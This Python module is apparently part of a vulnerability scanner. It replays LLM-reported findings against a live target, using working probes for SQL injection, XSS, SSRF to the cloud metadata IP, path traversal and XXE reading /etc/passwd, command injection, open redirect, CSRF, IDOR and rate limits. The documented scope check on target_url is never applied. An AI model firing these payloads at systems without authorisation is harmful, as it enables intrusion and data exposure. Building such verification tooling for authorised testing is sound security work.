"""Runtime Finding Verifier — replays actual payloads against live target.

No LLM. No pattern matching. Real HTTP requests with real responses.

For each finding the LLM reported, this module:
  1. Reconstructs the attack request from the finding metadata
  2. Sends it to the live target (with the same auth session)
  3. Analyzes the real response for exploitation indicators
  4. Returns a definitive verdict: CONFIRMED / DISPROVED / INCONCLUSIVE

Verification strategies per vulnerability class:
  - SQLi:      Boolean differential (1=1 vs 1=2) + error string detection
  - XSS:       Inject unique canary, check if reflected unencoded
  - SSRF:      Request internal metadata IP, check for internal content
  - Path Trav: Request ../../etc/passwd, check for root:x:0
  - Cmd Inj:   Time-based differential (sleep N, measure delta)
  - Open Redir: Check Location header for external domain
  - CSRF:      Replay without token, check if accepted
  - Headers:   Fetch URL, inspect response headers directly
  - Cookies:   Fetch URL, inspect Set-Cookie attributes
  - IDOR:      Compare response for original ID vs tampered ID
"""

import asyncio
import hashlib
import logging
import re
import time
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse, urljoin

import httpx

logger = logging.getLogger("runtime_verifier")

VERIFY_TIMEOUT = 15.0
CANARY = "xvrf7k3q9z"
TIME_DELAY_SECONDS = 3
TIME_THRESHOLD = 2.0  # if response is >=2s slower than baseline, likely time-based


# ──────────────────────────────────────────────────────────────────────
# Result structure
# ──────────────────────────────────────────────────────────────────────

def _result(verdict: str, method: str, evidence: str, details: dict | None = None) -> dict:
    return {
        "verified": True,
        "verdict": verdict,            # CONFIRMED | DISPROVED | INCONCLUSIVE
        "verification_method": method,
        "verification_evidence": evidence,
        "verification_details": details or {},
    }


NOT_VERIFIED = {
    "verified": False,
    "verdict": "UNVERIFIED",
    "verification_method": "none",
    "verification_evidence": "Verification not attempted (no URL or unsupported type).",
    "verification_details": {},
}


# ──────────────────────────────────────────────────────────────────────
# HTTP helpers
# ──────────────────────────────────────────────────────────────────────

async def _get(client: httpx.AsyncClient, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.get(url, timeout=VERIFY_TIMEOUT, follow_redirects=False, **kw)
    except Exception as e:
        logger.debug("GET %s failed: %s", url, e)
        return None


async def _post(client: httpx.AsyncClient, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.post(url, timeout=VERIFY_TIMEOUT, follow_redirects=False, **kw)
    except Exception as e:
        logger.debug("POST %s failed: %s", url, e)
        return None


async def _request(client: httpx.AsyncClient, method: str, url: str, **kw) -> httpx.Response | None:
    try:
        return await client.request(method, url, timeout=VERIFY_TIMEOUT, follow_redirects=False, **kw)
    except Exception as e:
        logger.debug("%s %s failed: %s", method, url, e)
        return None


async def _timed_request(client: httpx.AsyncClient, method: str, url: str, **kw) -> tuple[httpx.Response | None, float]:
    start = time.monotonic()
    resp = await _request(client, method, url, **kw)
    elapsed = time.monotonic() - start
    return resp, elapsed


def _inject_param(url: str, param: str, value: str) -> str:
    """Replace or add a query parameter in a URL."""
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [value]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def _body_text(resp: httpx.Response | None) -> str:
    if resp is None:
        return ""
    try:
        return resp.text[:50000].lower()
    except Exception:
        return ""


def _capture(resp: httpx.Response | None, url: str, method: str = "GET",
             body: str = "", label: str = "") -> dict:
    """Capture an HTTP exchange for inclusion in verification_details."""
    entry = {"label": label, "method": method, "url": url[:500]}
    if body:
        entry["request_body"] = str(body)[:800]
    if resp is not None:
        entry["status"] = resp.status_code
        try:
            resp_text = resp.text[:1000]
        except Exception:
            resp_text = "(binary or unreadable)"
        entry["response_body"] = resp_text
        entry["response_size"] = len(resp.text) if hasattr(resp, "text") else 0
    else:
        entry["status"] = None
        entry["response_body"] = "(no response)"
    return entry


# ──────────────────────────────────────────────────────────────────────
# Per-vulnerability verifiers
# ──────────────────────────────────────────────────────────────────────

SQL_ERRORS = [
    "syntax error", "mysql", "postgresql", "oracle", "sql server", "sqlite",
    "unclosed quotation", "you have an error in your sql", "odbc", "jdbc",
    "ora-", "pg_query", "microsoft ole db", "warning: mysql", "mariadb",
    "sqlstate", "pdo_", "pg_exec", "unterminated string",
]


async def _verify_sqli(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify SQL injection using boolean differential + error-based detection."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "sqli_replay", "Missing URL or parameter for replay.")

    exchanges = []

    baseline_url = _inject_param(url, param, "testvalue")
    baseline = await _get(client, baseline_url)
    baseline_body = _body_text(baseline)
    baseline_len = len(baseline_body)
    exchanges.append(_capture(baseline, baseline_url, "GET", label="Baseline (clean value)"))

    error_url = _inject_param(url, param, "testvalue'")
    error_resp = await _get(client, error_url)
    error_body = _body_text(error_resp)
    exchanges.append(_capture(error_resp, error_url, "GET", label="Error-based (single quote)"))

    sql_errors_found = [kw for kw in SQL_ERRORS if kw in error_body]
    if sql_errors_found:
        return _result("CONFIRMED", "sqli_error_based",
                       f"SQL error strings in response: {sql_errors_found[:3]}",
                       {"payload": "testvalue'", "sql_errors": sql_errors_found[:5],
                        "status": error_resp.status_code if error_resp else None,
                        "exchanges": exchanges})

    true_url = _inject_param(url, param, "testvalue' OR '1'='1")
    false_url = _inject_param(url, param, "testvalue' OR '1'='2")
    true_resp = await _get(client, true_url)
    false_resp = await _get(client, false_url)
    exchanges.append(_capture(true_resp, true_url, "GET", label="Boolean TRUE (1=1)"))
    exchanges.append(_capture(false_resp, false_url, "GET", label="Boolean FALSE (1=2)"))

    true_body = _body_text(true_resp)
    false_body = _body_text(false_resp)
    true_len = len(true_body)
    false_len = len(false_body)

    if true_resp and false_resp:
        len_diff = abs(true_len - false_len)
        if len_diff > 100 and true_len != baseline_len:
            return _result("CONFIRMED", "sqli_boolean_differential",
                           f"Boolean differential: true={true_len} chars, false={false_len} chars, "
                           f"baseline={baseline_len} chars. Δ={len_diff}",
                           {"true_len": true_len, "false_len": false_len,
                            "baseline_len": baseline_len, "delta": len_diff,
                            "exchanges": exchanges})

    time_url = _inject_param(url, param, "testvalue' OR SLEEP(3)-- -")
    _, baseline_time = await _timed_request(client, "GET", baseline_url)
    sleep_resp, sleep_time = await _timed_request(client, "GET", time_url)
    exchanges.append(_capture(sleep_resp, time_url, "GET", label=f"Time-based SLEEP(3) — {sleep_time:.1f}s"))

    time_delta = sleep_time - baseline_time
    if time_delta >= TIME_THRESHOLD:
        return _result("CONFIRMED", "sqli_time_based",
                       f"Time differential: baseline={baseline_time:.1f}s, "
                       f"sleep={sleep_time:.1f}s, Δ={time_delta:.1f}s",
                       {"baseline_time": round(baseline_time, 2),
                        "sleep_time": round(sleep_time, 2),
                        "delta": round(time_delta, 2), "exchanges": exchanges})

    return _result("DISPROVED", "sqli_replay",
                   "No SQL errors, no boolean differential, no time differential. "
                   "Server handles the input safely.",
                   {"error_status": error_resp.status_code if error_resp else None,
                    "boolean_delta": abs(true_len - false_len) if true_resp and false_resp else 0,
                    "exchanges": exchanges})


async def _verify_xss(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify XSS by injecting a unique canary and checking reflection."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "xss_replay", "Missing URL or parameter.")

    exchanges = []
    canaries = [
        f"<{CANARY}>",
        f"<img src=x onerror={CANARY}>",
        f'"{CANARY}',
        f"javascript:{CANARY}",
    ]

    for canary in canaries:
        test_url = _inject_param(url, param, canary)
        resp = await _get(client, test_url)
        body = _body_text(resp)
        exchanges.append(_capture(resp, test_url, "GET", label=f"XSS canary: {canary[:40]}"))

        if canary.lower() in body:
            encoded_check = canary.replace("<", "&lt;").replace(">", "&gt;").lower()
            if encoded_check in body and canary.lower() not in body.replace(encoded_check, ""):
                continue

            return _result("CONFIRMED", "xss_reflection",
                           f"Canary '{canary}' reflected UNENCODED in response body.",
                           {"canary": canary, "status": resp.status_code if resp else None,
                            "reflected_at": body.find(canary.lower()), "exchanges": exchanges})

    return _result("DISPROVED", "xss_reflection",
                   "None of the XSS canaries reflected unencoded. Input is sanitized or rejected.",
                   {"exchanges": exchanges})


async def _verify_ssrf(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify SSRF by requesting internal metadata endpoint."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "ssrf_replay", "Missing URL or parameter.")

    exchanges = []
    ssrf_targets = [
        ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "hostname", "iam"]),
        ("http://127.0.0.1:80/", ["html", "head", "body", "server"]),
    ]

    for ssrf_url, indicators in ssrf_targets:
        test_url = _inject_param(url, param, ssrf_url)
        resp = await _get(client, test_url)
        body = _body_text(resp)
        exchanges.append(_capture(resp, test_url, "GET", label=f"SSRF target: {ssrf_url}"))

        hits = [kw for kw in indicators if kw in body]
        if hits and resp and resp.status_code == 200:
            return _result("CONFIRMED", "ssrf_replay",
                           f"Internal content found: {hits[:3]}. Server fetched {ssrf_url}.",
                           {"ssrf_url": ssrf_url, "indicators_found": hits,
                            "status": resp.status_code, "exchanges": exchanges})

    return _result("DISPROVED", "ssrf_replay",
                   "SSRF payloads returned no internal content. Server rejects or blocks internal URLs.",
                   {"exchanges": exchanges})


async def _verify_path_traversal(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify path traversal by requesting known OS files."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "path_traversal_replay", "Missing URL or parameter.")

    exchanges = []
    traversals = [
        ("../../../../../../etc/passwd", ["root:x:0", "root:*:0", "nobody:"]),
        ("../../../../../../etc/hosts", ["localhost", "127.0.0.1"]),
        ("..\\..\\..\\..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
    ]

    for payload, indicators in traversals:
        test_url = _inject_param(url, param, payload)
        resp = await _get(client, test_url)
        body = _body_text(resp)
        exchanges.append(_capture(resp, test_url, "GET", label=f"Traversal: {payload[:30]}"))

        hits = [kw for kw in indicators if kw in body]
        if hits:
            return _result("CONFIRMED", "path_traversal_replay",
                           f"OS file content found: {hits[:3]}. Payload: {payload}",
                           {"payload": payload, "indicators": hits,
                            "status": resp.status_code if resp else None,
                            "exchanges": exchanges})

    return _result("DISPROVED", "path_traversal_replay",
                   "No OS file content in any traversal response. Path is sanitized.",
                   {"exchanges": exchanges})


async def _verify_command_injection(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify command injection using time-based differential."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "cmdi_replay", "Missing URL or parameter.")

    exchanges = []
    baseline_url = _inject_param(url, param, "harmless")
    baseline_resp, baseline_time = await _timed_request(client, "GET", baseline_url)
    exchanges.append(_capture(baseline_resp, baseline_url, "GET", label=f"Baseline — {baseline_time:.1f}s"))

    sleep_payloads = [
        f"; sleep {TIME_DELAY_SECONDS}",
        f"| sleep {TIME_DELAY_SECONDS}",
        f"`sleep {TIME_DELAY_SECONDS}`",
        f"& timeout /t {TIME_DELAY_SECONDS}",
    ]

    for payload in sleep_payloads:
        sleep_url = _inject_param(url, param, payload)
        sleep_resp, sleep_time = await _timed_request(client, "GET", sleep_url)
        delta = sleep_time - baseline_time
        exchanges.append(_capture(sleep_resp, sleep_url, "GET",
                                  label=f"Sleep payload — {sleep_time:.1f}s (Δ{delta:.1f}s)"))

        if delta >= TIME_THRESHOLD:
            return _result("CONFIRMED", "cmdi_time_based",
                           f"Time differential: baseline={baseline_time:.1f}s, "
                           f"payload={sleep_time:.1f}s, Δ={delta:.1f}s. Payload: {payload}",
                           {"payload": payload, "baseline": round(baseline_time, 2),
                            "with_payload": round(sleep_time, 2), "delta": round(delta, 2),
                            "exchanges": exchanges})

    output_payloads = ["; id", "| whoami", "`id`"]
    output_indicators = ["uid=", "gid=", "root", "www-data", "nobody"]

    for payload in output_payloads:
        test_url = _inject_param(url, param, payload)
        resp = await _get(client, test_url)
        body = _body_text(resp)
        exchanges.append(_capture(resp, test_url, "GET", label=f"Output check: {payload}"))
        hits = [kw for kw in output_indicators if kw in body]
        if hits:
            return _result("CONFIRMED", "cmdi_output",
                           f"OS command output found: {hits[:3]}. Payload: {payload}",
                           {"payload": payload, "indicators": hits, "exchanges": exchanges})

    return _result("DISPROVED", "cmdi_replay",
                   "No time differential and no OS output. Command injection not exploitable.",
                   {"exchanges": exchanges})


async def _verify_open_redirect(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify open redirect by checking Location header."""
    url = finding.get("url", "")
    param = finding.get("parameter", "")
    if not url or not param:
        return _result("INCONCLUSIVE", "redirect_replay", "Missing URL or parameter.")

    exchanges = []
    evil_domain = "https://evil-redirect-verify-test.example.com/"
    test_payloads = [
        evil_domain,
        "//evil-redirect-verify-test.example.com/",
        "/\\evil-redirect-verify-test.example.com/",
    ]

    for payload in test_payloads:
        test_url = _inject_param(url, param, payload)
        resp = await _get(client, test_url)
        loc = resp.headers.get("location", "(none)") if resp else "(no response)"
        ex = _capture(resp, test_url, "GET", label=f"Redirect payload → Location: {loc[:60]}")
        exchanges.append(ex)
        if resp is None:
            continue

        if resp.status_code in (301, 302, 303, 307, 308):
            location = resp.headers.get("location", "")
            if "evil-redirect-verify-test" in location.lower():
                return _result("CONFIRMED", "redirect_location_header",
                               f"Server redirects to attacker domain. "
                               f"Location: {location[:200]}",
                               {"payload": payload, "status": resp.status_code,
                                "location": location[:200], "exchanges": exchanges})

    return _result("DISPROVED", "redirect_replay",
                   "Server does not redirect to external domain. Redirect is properly restricted.",
                   {"exchanges": exchanges})


async def _verify_csrf(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify CSRF by replaying request without any token."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "csrf_replay", "Missing URL.")

    exchanges = []
    resp_get = await _get(client, url)
    body = _body_text(resp_get)
    exchanges.append(_capture(resp_get, url, "GET", label="Fetch form page (check for CSRF token)"))

    token_patterns = [
        r'name=["\']?csrf[_-]?token["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?_token["\']?\s+value=["\']([^"\']+)',
        r'name=["\']?authenticity_token["\']?\s+value=["\']([^"\']+)',
        r'X-CSRF-TOKEN.*?content=["\']([^"\']+)',
    ]

    has_csrf_field = any(re.search(p, body, re.IGNORECASE) for p in token_patterns)

    resp_no_token = await _post(client, url, data={"test": "verify"})
    exchanges.append(_capture(resp_no_token, url, "POST",
                              body="test=verify (no CSRF token)",
                              label="POST without CSRF token"))

    if resp_no_token and resp_no_token.status_code in (200, 201, 204):
        if has_csrf_field:
            return _result("CONFIRMED", "csrf_replay",
                           f"POST accepted without CSRF token (status {resp_no_token.status_code}). "
                           "CSRF token field exists in form but server doesn't validate it.",
                           {"status_without_token": resp_no_token.status_code, "exchanges": exchanges})
        else:
            return _result("CONFIRMED", "csrf_replay",
                           f"No CSRF token in form AND POST accepted (status {resp_no_token.status_code}). "
                           "Endpoint has no CSRF protection.",
                           {"status_without_token": resp_no_token.status_code,
                            "has_csrf_field": False, "exchanges": exchanges})

    if resp_no_token and resp_no_token.status_code in (403, 419, 422):
        return _result("DISPROVED", "csrf_replay",
                       f"Server rejected tokenless POST with {resp_no_token.status_code}. "
                       "CSRF protection is enforced.",
                       {"status_without_token": resp_no_token.status_code, "exchanges": exchanges})

    return _result("INCONCLUSIVE", "csrf_replay",
                   f"Inconclusive: POST returned {resp_no_token.status_code if resp_no_token else 'no response'}.",
                   {"exchanges": exchanges})


async def _verify_missing_headers(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify missing security headers by directly inspecting response headers."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "header_check", "Missing URL.")

    resp = await _get(client, url)
    if resp is None:
        return _result("INCONCLUSIVE", "header_check", "Could not reach the URL.")

    exchanges = [_capture(resp, url, "GET", label="Fetch URL to inspect response headers")]
    resp_headers_str = "\n".join(f"{k}: {v}" for k, v in resp.headers.items())
    exchanges[0]["response_headers"] = resp_headers_str[:1500]

    title = (finding.get("title", "") or "").lower()
    headers_lower = {k.lower(): v for k, v in resp.headers.items()}

    checks = {
        "hsts": ("strict-transport-security", None),
        "csp": ("content-security-policy", None),
        "x-frame": ("x-frame-options", None),
        "x-content-type": ("x-content-type-options", "nosniff"),
        "xcto": ("x-content-type-options", "nosniff"),
        "referrer": ("referrer-policy", None),
        "permissions": ("permissions-policy", None),
    }

    missing = []
    present = []
    for keyword, (header_name, expected_value) in checks.items():
        if keyword in title:
            val = headers_lower.get(header_name)
            if val is None:
                missing.append(header_name)
            elif expected_value and expected_value.lower() not in val.lower():
                missing.append(f"{header_name} (has '{val}', expected '{expected_value}')")
            else:
                present.append(f"{header_name}: {val[:80]}")

    if not missing and not present:
        all_security_headers = [
            "strict-transport-security", "content-security-policy",
            "x-frame-options", "x-content-type-options",
        ]
        for h in all_security_headers:
            if h in headers_lower:
                present.append(f"{h}: {headers_lower[h][:80]}")
            else:
                missing.append(h)

    if missing:
        return _result("CONFIRMED", "header_inspection",
                       f"Missing headers verified: {missing}",
                       {"missing": missing, "present": present,
                        "status": resp.status_code, "exchanges": exchanges})
    if present:
        return _result("DISPROVED", "header_inspection",
                       f"Headers ARE present: {present}",
                       {"present": present, "status": resp.status_code, "exchanges": exchanges})

    return _result("INCONCLUSIVE", "header_inspection", "Could not determine header status.",
                   {"exchanges": exchanges})


async def _verify_cookie_attrs(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify cookie security attributes from Set-Cookie headers."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "cookie_check", "Missing URL.")

    resp = await _get(client, url)
    if resp is None:
        return _result("INCONCLUSIVE", "cookie_check", "Could not reach URL.")

    exchanges = [_capture(resp, url, "GET", label="Fetch URL to inspect Set-Cookie headers")]

    set_cookies = resp.headers.get_list("set-cookie") if hasattr(resp.headers, "get_list") else []
    if not set_cookies:
        raw_sc = [v for k, v in resp.headers.multi_items() if k.lower() == "set-cookie"]
        set_cookies = raw_sc

    if set_cookies:
        exchanges[0]["set_cookie_headers"] = [sc[:300] for sc in set_cookies[:10]]

    if not set_cookies:
        return _result("INCONCLUSIVE", "cookie_check", "No Set-Cookie headers in response.",
                       {"exchanges": exchanges})

    issues = []
    for sc in set_cookies:
        sc_lower = sc.lower()
        cookie_name = sc.split("=")[0].strip()
        is_session = any(kw in cookie_name.lower() for kw in [
            "session", "sid", "token", "auth", "jwt", "phpsessid", "jsessionid",
        ])
        if is_session:
            if "httponly" not in sc_lower:
                issues.append(f"{cookie_name}: missing HttpOnly")
            if "secure" not in sc_lower:
                issues.append(f"{cookie_name}: missing Secure")
            if "samesite" not in sc_lower:
                issues.append(f"{cookie_name}: missing SameSite")

    if issues:
        return _result("CONFIRMED", "cookie_inspection",
                       f"Session cookie attribute issues: {issues}",
                       {"issues": issues, "cookies_checked": len(set_cookies),
                        "exchanges": exchanges})

    return _result("DISPROVED", "cookie_inspection",
                   "All session cookies have proper security attributes (HttpOnly, Secure, SameSite).",
                   {"cookies_checked": len(set_cookies), "exchanges": exchanges})


async def _verify_xxe(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify XXE by sending XML with entity reference."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "xxe_replay", "Missing URL.")

    xxe_payload = (
        '<?xml version="1.0"?><!DOCTYPE foo ['
        '<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']><root>&xxe;</root>'
    )

    resp = await _post(client, url,
                       content=xxe_payload,
                       headers={"Content-Type": "application/xml"})
    body = _body_text(resp)
    exchanges = [_capture(resp, url, "POST", body=xxe_payload, label="XXE entity injection")]

    indicators = ["root:x:0", "root:*:0", "nobody:", "/bin/bash", "/bin/sh"]
    hits = [kw for kw in indicators if kw in body]
    if hits:
        return _result("CONFIRMED", "xxe_replay",
                       f"XXE payload processed — file content found: {hits[:3]}",
                       {"indicators": hits, "status": resp.status_code if resp else None,
                        "exchanges": exchanges})

    return _result("DISPROVED", "xxe_replay",
                   "XXE payload sent but no file content in response. XML parser is safe.",
                   {"exchanges": exchanges})


async def _verify_idor(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify IDOR by accessing a different resource ID."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "idor_replay", "Missing URL.")

    id_pattern = re.compile(r'(/|\?|&)(id|user_id|account|profile|order)=?(\d+)', re.IGNORECASE)
    match = id_pattern.search(url)
    if not match:
        path_id = re.search(r'/(\d{2,})', url)
        if not path_id:
            return _result("INCONCLUSIVE", "idor_replay",
                           "Could not identify numeric ID in URL to tamper with.")
        original_id = path_id.group(1)
        tampered_id = str(int(original_id) + 1)
        tampered_url = url.replace(f"/{original_id}", f"/{tampered_id}", 1)
    else:
        original_id = match.group(3)
        tampered_id = str(int(original_id) + 1)
        tampered_url = url.replace(original_id, tampered_id, 1)

    exchanges = []
    resp_orig = await _get(client, url)
    exchanges.append(_capture(resp_orig, url, "GET", label=f"Original ID={original_id}"))
    resp_tampered = await _get(client, tampered_url)
    exchanges.append(_capture(resp_tampered, tampered_url, "GET", label=f"Tampered ID={tampered_id}"))

    if resp_tampered is None:
        return _result("INCONCLUSIVE", "idor_replay", "Tampered request failed.",
                       {"exchanges": exchanges})

    if resp_tampered.status_code in (401, 403):
        return _result("DISPROVED", "idor_replay",
                       f"Server returned {resp_tampered.status_code} for tampered ID. "
                       "Authorization is enforced.",
                       {"original_id": original_id, "tampered_id": tampered_id,
                        "status": resp_tampered.status_code, "exchanges": exchanges})

    if resp_tampered.status_code == 200 and resp_orig and resp_orig.status_code == 200:
        orig_body = _body_text(resp_orig)
        tamp_body = _body_text(resp_tampered)
        if orig_body != tamp_body and len(tamp_body) > 100:
            return _result("CONFIRMED", "idor_replay",
                           f"Different data returned for ID {tampered_id} (status 200, "
                           f"{len(tamp_body)} chars). Potential unauthorized access.",
                           {"original_id": original_id, "tampered_id": tampered_id,
                            "original_len": len(orig_body), "tampered_len": len(tamp_body),
                            "exchanges": exchanges})

    return _result("INCONCLUSIVE", "idor_replay",
                   f"Tampered request returned {resp_tampered.status_code}. "
                   "Cannot definitively confirm or deny IDOR without multi-account context.",
                   {"exchanges": exchanges})


async def _verify_rate_limit(client: httpx.AsyncClient, finding: dict) -> dict:
    """Verify rate limiting by sending rapid requests."""
    url = finding.get("url", "")
    if not url:
        return _result("INCONCLUSIVE", "rate_limit_check", "Missing URL.")

    BURST = 15
    statuses = []
    exchanges = []
    for i in range(BURST):
        resp = await _post(client, url, data={"username": "test", "password": "test"})
        if resp:
            statuses.append(resp.status_code)
            if i < 3 or resp.status_code == 429:
                exchanges.append(_capture(resp, url, "POST",
                                          body="username=test&password=test",
                                          label=f"Burst request #{i+1} → {resp.status_code}"))
            if resp.status_code == 429:
                break

    if 429 in statuses:
        idx = statuses.index(429)
        return _result("DISPROVED", "rate_limit_burst",
                       f"Rate limiting triggered after {idx + 1} requests (HTTP 429).",
                       {"burst_size": len(statuses), "statuses": statuses,
                        "triggered_at": idx + 1, "exchanges": exchanges})

    if len(statuses) >= 10 and all(s in (200, 302, 301) for s in statuses):
        return _result("CONFIRMED", "rate_limit_burst",
                       f"All {len(statuses)} rapid requests accepted. No 429. No rate limiting.",
                       {"burst_size": len(statuses), "statuses": statuses, "exchanges": exchanges})

    return _result("INCONCLUSIVE", "rate_limit_burst",
                   f"Sent {len(statuses)} requests: {list(set(statuses))}. Cannot determine conclusively.",
                   {"statuses": statuses, "exchanges": exchanges})


# ──────────────────────────────────────────────────────────────────────
# Dispatcher: route finding to the right verifier
# ──────────────────────────────────────────────────────────────────────

VULN_DISPATCH = [
    (["sql", "injection"],                                       _verify_sqli),
    (["xss", "cross-site scripting", "cross site scripting"],    _verify_xss),
    (["ssrf", "server-side request"],                            _verify_ssrf),
    (["xxe", "xml external", "xml entity"],                      _verify_xxe),
    (["path traversal", "directory traversal",
      "local file inclusion", "file inclusion"],                 _verify_path_traversal),
    (["command injection", "remote code execution",
      "os command", "shell injection"],                          _verify_command_injection),
    (["open redirect"],                                          _verify_open_redirect),
    (["csrf"],                                                   _verify_csrf),
    (["idor", "insecure direct object", "broken object"],        _verify_idor),
    (["rate limit", "brute force"],                              _verify_rate_limit),
    (["missing header", "hsts", "csp", "x-frame",
      "x-content-type", "security header",
      "referrer policy", "permissions policy"],                  _verify_missing_headers),
    (["cookie", "httponly", "secure flag", "samesite"],          _verify_cookie_attrs),
]


def _find_verifier(title: str):
    title_lower = title.lower()
    for keywords, verifier in VULN_DISPATCH:
        if any(kw in title_lower for kw in keywords):
            return verifier
    return None


# ──────────────────────────────────────────────────────────────────────
# Public API
# ──────────────────────────────────────────────────────────────────────

async def verify_finding(
    client: httpx.AsyncClient,
    finding: dict,
) -> dict:
    """Verify a single finding by replaying against the live target.

    Returns the finding dict enriched with verification_ keys.
    """
    title = finding.get("title", "") or ""
    verifier = _find_verifier(title)

    if verifier is None:
        return {**finding, **NOT_VERIFIED}

    try:
        result = await verifier(client, finding)
    except Exception as e:
        logger.warning("Verification failed for '%s': %s", title, e)
        result = _result("INCONCLUSIVE", "error", f"Verification error: {e}")

    return {**finding, **result}


async def verify_all_findings(
    findings: list[dict],
    target_url: str,
    cookies: dict | None = None,
    headers: dict | None = None,
    on_progress=None,
    cancel_flag=None,
    pause_flag=None,
) -> list[dict]:
    """Verify all findings from a scan against the live target.

    Args:
        findings: list of finding dicts from the LLM scan
        target_url: the target URL (for scope checking)
        cookies: auth cookies from the scan session
        headers: auth headers from the scan session
        on_progress: optional callback(idx, total, finding_title, verdict)
        cancel_flag: threading.Event to signal cancellation
        pause_flag: threading.Event to signal pause

    Returns:
        list of findings enriched with verification data
    """
    if not findings:
        return []

    import time as _time

    async with httpx.AsyncClient(
        cookies=cookies or {},
        headers=headers or {},
        timeout=VERIFY_TIMEOUT,
        verify=False,
    ) as client:
        verified = []
        total = len(findings)
        for idx, finding in enumerate(findings):
            if cancel_flag and cancel_flag.is_set():
                for remaining in findings[idx:]:
                    verified.append({**remaining, **NOT_VERIFIED})
                break
            if pause_flag and pause_flag.is_set():
                while pause_flag.is_set():
                    if cancel_flag and cancel_flag.is_set():
                        for remaining in findings[idx:]:
                            verified.append({**remaining, **NOT_VERIFIED})
                        return verified
                    _time.sleep(1)
            logger.info("Verifying [%d/%d]: %s", idx + 1, total, finding.get("title", "?"))
            result = await verify_finding(client, finding)
            verified.append(result)

            if on_progress:
                try:
                    on_progress(idx + 1, total, finding.get("title", ""),
                                result.get("verdict", "UNVERIFIED"))
                except Exception:
                    pass

        stats = {
            "total": total,
            "confirmed": sum(1 for f in verified if f.get("verdict") == "CONFIRMED"),
            "disproved": sum(1 for f in verified if f.get("verdict") == "DISPROVED"),
            "inconclusive": sum(1 for f in verified if f.get("verdict") == "INCONCLUSIVE"),
            "unverified": sum(1 for f in verified if f.get("verdict") == "UNVERIFIED"),
        }
        logger.info("Verification complete: %s", stats)

        return verified
